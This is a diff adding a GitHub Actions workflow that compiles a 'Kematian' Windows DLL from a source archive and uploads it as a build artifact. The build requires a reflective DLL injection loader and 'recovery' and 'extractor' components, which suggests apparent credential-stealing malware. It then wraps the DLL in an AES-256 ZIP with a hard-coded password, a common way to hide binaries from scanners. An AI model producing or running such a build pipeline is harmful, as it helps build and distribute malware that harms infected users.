@@ -1,0 +1,287 @@
+name: Build Kematian Windows DLL
+
+on:
+  push:
+  workflow_dispatch:
+
+permissions:
+  contents: read
+
+jobs:
+  build-windows-amd64:
+    name: Build Windows x64 DLL from kematian.zip
+    runs-on: windows-latest
+    timeout-minutes: 45
+
+    steps:
+      - name: Check out repository
+        uses: actions/checkout@v7
+        with:
+          persist-credentials: false
+
+      - name: Copy and extract source archive
+        id: source
+        shell: pwsh
+        run: |
+          $ErrorActionPreference = 'Stop'
+
+          $repoArchive = Join-Path $env:GITHUB_WORKSPACE 'kematian.zip'
+          $repoBuildScript = Join-Path $env:GITHUB_WORKSPACE 'build-windows.bat'
+          if (-not (Test-Path -LiteralPath $repoArchive -PathType Leaf)) {
+            throw "Required input archive is missing from the repository root: $repoArchive"
+          }
+          if ((Get-Item -LiteralPath $repoArchive).Length -le 0) {
+            throw 'The repository-root kematian.zip is empty.'
+          }
+          if (-not (Test-Path -LiteralPath $repoBuildScript -PathType Leaf)) {
+            throw "Required build script is missing from the repository root: $repoBuildScript"
+          }
+
+          $stageRoot = Join-Path $env:RUNNER_TEMP 'kematian-build'
+          $sourceRoot = Join-Path $stageRoot 'source'
+          $runnerArchive = Join-Path $stageRoot 'kematian-input.zip'
+
+          if (Test-Path -LiteralPath $stageRoot) {
+            Remove-Item -LiteralPath $stageRoot -Recurse -Force
+          }
+          New-Item -ItemType Directory -Path $sourceRoot -Force | Out-Null
+
+          Copy-Item -LiteralPath $repoArchive -Destination $runnerArchive
+          Expand-Archive -LiteralPath $runnerArchive -DestinationPath $sourceRoot -Force
+
+          # The archive must contain the project files directly at its root.
+          # For example, native\go.mod must exist at sourceRoot\native\go.mod.
+          $required = @(
+            'native\go.mod',
+            'rust-extractor\Cargo.toml',
+            'native\recovery\platform\embedded_dll.go',
+            'vendor\injection\ReflectiveLoader.c',
+            'package.json',
+            'gen-icons.mjs',
+            'server.src.js'
+          )
+          foreach ($relativePath in $required) {
+            $candidate = Join-Path $sourceRoot $relativePath
+            if (-not (Test-Path -LiteralPath $candidate -PathType Leaf)) {
+              throw "Expected root-level project file was not found after extracting kematian.zip: $relativePath. Ensure the ZIP contains the files directly at its root, not inside an extra kematian/ directory."
+            }
+          }
+
+          # Keep the build script outside the archive if desired; stage it beside
+          # the extracted project so %~dp0 resolves to the extracted project root.
+          Copy-Item -LiteralPath $repoBuildScript -Destination (Join-Path $sourceRoot 'build-windows.bat') -Force
+
+          "BUILD_ROOT=$sourceRoot" >> $env:GITHUB_ENV
+          Write-Host "Source archive copied to: $runnerArchive"
+          Write-Host "Source extracted to: $sourceRoot"
+
+      - name: Determine Go version from extracted go.mod
+        id: go-version
+        shell: pwsh
+        run: |
+          $ErrorActionPreference = 'Stop'
+          $goMod = Join-Path $env:BUILD_ROOT 'native\go.mod'
+          $contents = Get-Content -LiteralPath $goMod -Raw
+
+          # Prefer the explicit toolchain directive when present, then use the
+          # module's go directive. setup-go accepts both major.minor and patch versions.
+          if ($contents -match '(?m)^\s*toolchain\s+go([0-9]+\.[0-9]+(?:\.[0-9]+)?)\b') {
+            $version = $Matches[1]
+          } elseif ($contents -match '(?m)^\s*go\s+([0-9]+\.[0-9]+(?:\.[0-9]+)?)\b') {
+            $version = $Matches[1]
+          } else {
+            throw "Could not find a valid 'go' or 'toolchain' directive in $goMod."
+          }
+
+          "version=$version" >> $env:GITHUB_OUTPUT
+          Write-Host "Using Go version: $version"
+
+      - name: Set up Go
+        uses: actions/setup-go@v7
+        with:
+          go-version: ${{ steps.go-version.outputs.version }}
+          cache: false
+
+      - name: Set up Rust and the Windows GNU target
+        uses: dtolnay/rust-toolchain@stable
+        with:
+          targets: x86_64-pc-windows-gnu
+
+      - name: Install MinGW-w64 GCC
+        id: msys2
+        uses: msys2/setup-msys2@v2
+        with:
+          msystem: MINGW64
+          update: true
+          install: mingw-w64-x86_64-gcc
+
+      - name: Configure native linkers
+        shell: pwsh
+        env:
+          MSYS2_LOCATION: ${{ steps.msys2.outputs.msys2-location }}
+        run: |
+          $ErrorActionPreference = 'Stop'
+          $gcc = Join-Path $env:MSYS2_LOCATION 'mingw64\bin\gcc.exe'
+          if (-not (Test-Path -LiteralPath $gcc -PathType Leaf)) {
+            throw "MinGW-w64 GCC was not found at the expected path: $gcc"
+          }
+
+          & $gcc --version
+          if ($LASTEXITCODE -ne 0) {
+            throw 'MinGW-w64 GCC did not run successfully.'
+          }
+
+          $gccBin = Split-Path -Parent $gcc
+          $gccBin >> $env:GITHUB_PATH
+          "CC=$gcc" >> $env:GITHUB_ENV
+          "CARGO_TARGET_X86_64_PC_WINDOWS_GNU_LINKER=$gcc" >> $env:GITHUB_ENV
+          'BUILD_TARGETS=windows-amd64' >> $env:GITHUB_ENV
+          'GOWORK=off' >> $env:GITHUB_ENV
+
+      - name: Set up Bun
+        uses: oven-sh/setup-bun@v2
+
+      - name: Build the Windows DLL and normal plugin bundle
+        shell: cmd
+        env:
+          PLUGIN_SIGN_KEY: ${{ secrets.PLUGIN_SIGN_KEY }}
+        run: |
+          call "%BUILD_ROOT%\build-windows.bat"
+          if errorlevel 1 exit /b 1
+
+      - name: Verify compiled DLL
+        shell: pwsh
+        run: |
+          $ErrorActionPreference = 'Stop'
+          $dll = Join-Path $env:BUILD_ROOT 'kematian-windows-amd64.dll'
+          if (-not (Test-Path -LiteralPath $dll -PathType Leaf)) {
+            throw "Build succeeded without producing the expected DLL: $dll"
+          }
+          if ((Get-Item -LiteralPath $dll).Length -le 0) {
+            throw "The compiled DLL is empty: $dll"
+          }
+          Write-Host "Verified compiled DLL: $dll"
+
+      - name: Set up 7-Zip for AES-256 ZIP encryption
+        id: sevenzip
+        shell: pwsh
+        run: |
+          $ErrorActionPreference = 'Stop'
+          $command = Get-Command '7z.exe' -ErrorAction SilentlyContinue
+          $sevenZip = if ($command) { $command.Source } else { $null }
+
+          # Check standard install paths before installing, because 7-Zip may be
+          # present on a hosted runner without its directory being on PATH.
+          if (-not $sevenZip) {
+            foreach ($candidate in @(
+              'C:\Program Files\7-Zip\7z.exe',
+              'C:\Program Files (x86)\7-Zip\7z.exe'
+            )) {
+              if (Test-Path -LiteralPath $candidate -PathType Leaf) {
+                $sevenZip = $candidate
+                break
+              }
+            }
+          }
+
+          if (-not $sevenZip) {
+            $choco = Get-Command 'choco.exe' -ErrorAction SilentlyContinue
+            if (-not $choco) {
+              throw '7-Zip is unavailable and Chocolatey (choco.exe) was not found on the runner.'
+            }
+            & $choco.Source install 7zip -y --no-progress
+            if ($LASTEXITCODE -ne 0) {
+              throw "Chocolatey failed to install 7-Zip (exit code $LASTEXITCODE)."
+            }
+
+            $command = Get-Command '7z.exe' -ErrorAction SilentlyContinue
+            if ($command) {
+              $sevenZip = $command.Source
+            } else {
+              foreach ($candidate in @(
+                'C:\Program Files\7-Zip\7z.exe',
+                'C:\Program Files (x86)\7-Zip\7z.exe'
+              )) {
+                if (Test-Path -LiteralPath $candidate -PathType Leaf) {
+                  $sevenZip = $candidate
+                  break
+                }
+              }
+            }
+          }
+
+          if (-not $sevenZip -or -not (Test-Path -LiteralPath $sevenZip -PathType Leaf)) {
+            throw '7-Zip installation completed, but 7z.exe could not be located.'
+          }
+
+          & $sevenZip i | Out-Null
+          if ($LASTEXITCODE -ne 0) {
+            throw '7-Zip failed its executable check.'
+          }
+          "path=$sevenZip" >> $env:GITHUB_OUTPUT
+          Write-Host "Using 7-Zip: $sevenZip"
+
+      - name: Create and verify password-protected DLL ZIP
+        shell: pwsh
+        env:
+          SEVEN_ZIP: ${{ steps.sevenzip.outputs.path }}
+        run: |
+          $ErrorActionPreference = 'Stop'
+          $dllName = 'kematian-windows-amd64.dll'
+          $dll = Join-Path $env:BUILD_ROOT $dllName
+          $releaseDir = Join-Path $env:RUNNER_TEMP 'kematian-release'
+          $protectedZip = Join-Path $releaseDir 'kematian-windows-amd64-protected.zip'
+
+          if (-not (Test-Path -LiteralPath $dll -PathType Leaf)) {
+            throw "Cannot package missing DLL: $dll"
+          }
+          New-Item -ItemType Directory -Path $releaseDir -Force | Out-Null
+          if (Test-Path -LiteralPath $protectedZip) {
+            Remove-Item -LiteralPath $protectedZip -Force
+          }
+
+          # The requested password is fixed here. ZIP AES-256 requires a ZIP
+          # utility such as 7-Zip; Compress-Archive does not support passwords.
+          $env:KEMATIAN_ZIP_PASSWORD = '@123456789'
+          Push-Location $env:BUILD_ROOT
+          try {
+            & $env:SEVEN_ZIP a -tzip -mem=AES256 "-p$($env:KEMATIAN_ZIP_PASSWORD)" -y $protectedZip $dllName
+            if ($LASTEXITCODE -ne 0) {
+              throw "7-Zip failed to create the password-protected ZIP (exit code $LASTEXITCODE)."
+            }
+          } finally {
+            Pop-Location
+          }
+
+          if (-not (Test-Path -LiteralPath $protectedZip -PathType Leaf) -or
+              (Get-Item -LiteralPath $protectedZip).Length -le 0) {
+            throw 'The password-protected ZIP was not created or is empty.'
+          }
+
+          # Verify the member is encrypted, then test that the requested password
+          # successfully decrypts the archive contents.
+          $listing = & $env:SEVEN_ZIP l -slt $protectedZip 2>&1 | Out-String
+          if ($LASTEXITCODE -ne 0) {
+            throw '7-Zip could not inspect the generated ZIP.'
+          }
+          if ($listing -notmatch '(?m)^Encrypted = \+$') {
+            throw 'The output ZIP member is not marked as encrypted; refusing to upload an unprotected archive.'
+          }
+          & $env:SEVEN_ZIP t "-p$($env:KEMATIAN_ZIP_PASSWORD)" $protectedZip
+          if ($LASTEXITCODE -ne 0) {
+            throw 'Password-protected ZIP test failed.'
+          }
+
+          # Ensure the archive member is at the ZIP root and is the DLL we expect.
+          if ($listing -notmatch '(?m)^Path = kematian-windows-amd64\.dll$') {
+            throw 'The protected ZIP does not contain kematian-windows-amd64.dll at its root.'
+          }
+          Write-Host "Verified AES-encrypted output ZIP: $protectedZip"
+
+      - name: Upload password-protected DLL ZIP artifact
+        uses: actions/upload-artifact@v7
+        with:
+          name: kematian-windows-amd64-protected
+          path: ${{ runner.temp }}/kematian-release/kematian-windows-amd64-protected.zip
+          if-no-files-found: error
+          retention-days: 14
